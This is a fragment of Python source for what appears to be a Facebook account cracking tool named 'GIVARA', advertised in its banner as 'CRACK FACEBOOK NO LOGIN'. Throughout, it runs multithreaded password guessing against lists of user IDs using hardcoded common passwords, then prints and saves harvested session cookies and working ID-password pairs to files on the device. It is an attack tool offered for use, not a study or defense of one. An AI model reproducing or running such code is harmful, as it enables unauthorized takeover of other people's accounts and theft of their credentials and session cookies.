...
try:
    ...
    import mechanize
    from ress.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install ress')
...
\033[1;37m[-] NEM TOOL   :\033[1;32m  G I V A R A
\033[1;37m[-] NRXI TOOL :\033[1;32m 5$
\033[1;37m[-] TOOLS      :\033[1;32m CRACK FACEBOOK NO LOGIN
\033[1;37m[-] VERSION   :\033[1;32m V.1
\033[1;97m===============================================================""")
    ...
    with ThreadPool(max_workers=70) as manshera:
        ...
        for love in user:
            ...
            for Eman in HamiiID:
                ...
                pwx.append('nazakam0000')
                pwx.append('123456654321')
                pwx.append('somakam0000')
                pwx.append('1234554321')
                ...
                pwx.append('kcha12345')
                pwx.append('kcha123')            
                pwx.append('zaxo12')
                pwx.append('zaxo123')
                pwx.append('zaxo1234')
                pwx.append('zaxozaxo')
                pwx.append('zaxozaxo1')
                pwx.append('zaxozaxo12')
                pwx.append('zaxozaxo123')
                pwx.append('zaxozaxo1234')
                pwx.append('zaxozaxo12345')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mGIVARA\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[GIVARA-OK] {cid} | {ps}")
                print(f"\033[1;97m[\033[1;91mCOOKIE\033[1;97m][👉] :\033[1;92m {coki}")
                #print(f'{B}User Agent--> {pro} \n')
                cek_apk(session,coki)
                print('')
                open('/sdcard/GIVARA-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f"\x1b[38;5;196m[GIVARA-CP😔] {cid} | {ps}")
                #print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/GIVARA-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[GIVARA] [%s/%s]  \033[1;92mOK\033[1;97m|  \r'%(loop,tl,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}IPYTHONI{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
...
def rcrack3(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mIGIVARA\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            #sys.stdout.write('\r[\033[1;92mIPYTHONI\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
			#sys.stdout.flush()
